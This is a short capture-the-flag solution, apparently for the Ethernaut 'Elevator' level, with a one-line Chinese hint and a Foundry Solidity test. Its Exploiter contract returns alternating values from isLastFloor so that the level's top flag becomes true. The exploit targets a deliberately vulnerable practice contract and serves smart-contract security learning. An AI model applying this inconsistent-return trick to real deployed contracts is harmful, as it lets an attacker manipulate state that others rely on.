构造两次返回不一致的 `isLastFloor` 即可

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Elevator.sol";
import "src/levels/ElevatorFactory.sol";

contract TestElevator is BaseTest {
    Elevator private level;

    constructor() public {
        levelFactory = new ElevatorFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance(true));
        level = Elevator(levelAddress);

        assertEq(level.top(), false);
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        Exploiter exploiter = new Exploiter(level);
        exploiter.goTo(0);

        assertEq(level.top(), true);

        vm.stopPrank();
    }
}

contract Exploiter is Building {
    Elevator private level;
    address private owner;
    bool top;

    constructor(Elevator _level) public {
        owner = msg.sender;
        level = _level;
        top = true;
    }

    function goTo(uint256 floor) public {
        level.goTo(floor);
    }

    function isLastFloor(uint256) external override returns (bool) {
        top = !top;
        return top;
    }
}
```

